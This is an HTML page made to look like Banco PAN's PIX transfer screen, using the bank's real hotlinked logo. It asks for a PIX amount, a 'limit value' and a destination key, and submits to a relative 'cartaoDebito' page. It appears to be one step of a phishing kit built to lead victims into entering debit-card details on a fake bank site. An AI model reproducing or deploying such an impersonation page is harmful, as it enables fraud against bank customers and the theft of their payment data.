<!DOCTYPE html>
<html lang="pt_br">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Banco PAN - PIX</title>

  <link rel="stylesheet" href="../style/style.css">

  <link rel="shortcut icon" href="https://accountstemplates.bancopan.com.br/assets/img/LogoPan_white.svg"
    type="image/x-icon">

</head>

<body>



  <img src="https://accountstemplates.bancopan.com.br/assets/img/LogoPan_white.svg" alt="Logo banco PAN"
    class="logo_bancoPan">

  <p class="textDescricao">Pra realizar<br />
    uma transação PIX <br />
    Preencha o formulário:
  </p>


  <form action="./cartaoDebito" method="post">
    <input type="text" name="valorPIX" id="valorPIX" autocomplete="off" maxlength="7"
      placeholder="Digite o valor do PIX" title="Digite o valor do PIX" required>
    <div class="linha"></div>

    <input type="text" name="limiteValorPIX" id="limiteValorPIX" autocomplete="off" maxlength="7"
      placeholder="Digite o valor limite do PIX" title="Digite o valor limite do PIX" required>
    <div class="linha"></div>

    <input type="text" name="chaveDestinoPIX" id="chaveDestinoPIX" autocomplete="off" maxlength="7"
      placeholder="Chave destino do PIX" title="Digite a chave destino do PIX" required>
    <div class="linha"></div>


    <p class="descricaoInput">Use apenas números</p>

    <input type="submit" id="RelizarPIX" value="Relizar transação">
  </form>

</body>

</html>
